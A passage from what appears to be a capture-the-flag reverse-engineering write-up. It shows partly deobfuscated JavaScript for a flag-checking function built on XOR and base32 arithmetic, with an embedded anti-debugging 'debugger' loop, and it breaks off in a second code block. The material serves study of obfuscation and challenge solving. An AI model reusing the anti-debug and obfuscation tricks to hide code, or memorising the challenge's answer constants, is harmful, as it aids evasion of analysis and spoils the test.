&#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = _0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f), <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">eval</span>(<span class="keyword">function</span> (<span class="params">_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2</span>) &#123;</span><br><span class="line">            _0x2d59cf = <span class="keyword">function</span> (<span class="params">_0x4be75f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&#x27;&#x27;</span> [<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>, <span class="title class_">String</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_0x46da6f--) _0x2829f2[<span class="title function_">_0x2d59cf</span>(_0x46da6f)] = _0x802d91[_0x46da6f] || <span class="title function_">_0x2d59cf</span>(_0x46da6f);</span><br><span class="line">                _0x802d91 = [</span><br><span class="line">                    <span class="keyword">function</span> (<span class="params">_0x5e8f1a</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> _0x2829f2[_0x5e8f1a];</span><br><span class="line">                    &#125;</span><br><span class="line">                ];</span><br><span class="line">                _0x2d59cf = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2b&#x27;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                _0x46da6f = <span class="number">0x1</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">while</span> (_0x46da6f--)</span><br><span class="line">                <span class="keyword">if</span> (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span> + <span class="title function_">_0x2d59cf</span>(_0x46da6f) + <span class="string">&#x27;\x5cb&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), _0x802d91[_0x46da6f]);</span><br><span class="line">            <span class="keyword">return</span> _0x200db2;</span><br><span class="line">        &#125;(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2d&#x27;</span>), <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>), <span class="number">0x0</span>, &#123;&#125;));</span><br><span class="line">        (<span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="keyword">function</span> (<span class="params">_0x3aba26</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title function_">_0xaed809</span>(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="keyword">function</span> (<span class="params">_0x3120e0</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3120e0 = <span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            <span class="keyword">return</span> _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x1c3854 = <span class="keyword">function</span> (<span class="params">_0x52ba71</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x52b956 = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x59c050 = <span class="number">0x0</span>; _0x59c050 &lt; _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x34f55b = (<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x2</span>)) ^ <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = <span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                (<span class="keyword">function</span> <span class="title function_">_0x3c3bd8</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (<span class="keyword">function</span> <span class="title function_">_0x4dc510</span>(<span class="params">_0x460a91</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> ((<span class="string">&#x27;&#x27;</span> + _0x460a91 / _0x460a91)[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x30&#x27;</span>)] !== <span class="number">0x1</span> || _0x460a91 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">                                (<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">debugger</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="title function_">_0x4dc510</span>(++_0x460a91);</span><br><span class="line">                        &#125;(<span class="number">0x0</span>));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (_0x30f185) &#123;</span><br><span class="line">                        <span class="built_in">setTimeout</span>(_0x3c3bd8, <span class="number">0x1388</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = <span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = <span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        h = <span class="keyword">function</span> (<span class="params">_0x4c466e, _0x28871</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3ea581 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x2fbf7a = <span class="number">0x0</span>; _0x2fbf7a &lt; _0x4c466e[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += <span class="title function_">_0x28871</span>(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] || (<span class="title function_">_0x1c3854</span>(j[<span class="number">0x0</span>]) ^ <span class="title function_">_0x1c3854</span>(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        l = <span class="title function_">h</span>(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x55b09f = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!m || <span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == <span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x4cbb89) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5bf136 = <span class="variable language_">document</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x32&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0x5bf136 == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x4d0e29 = <span class="title function_">check</span>(_0x5bf136);</span><br><span class="line">    <span class="keyword">if</span> (_0x4d0e29) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x38&#x27;</span>), <span class="number">0x32</span>);</span><br><span class="line">    <span class="title function_">test</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进一步反混淆</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 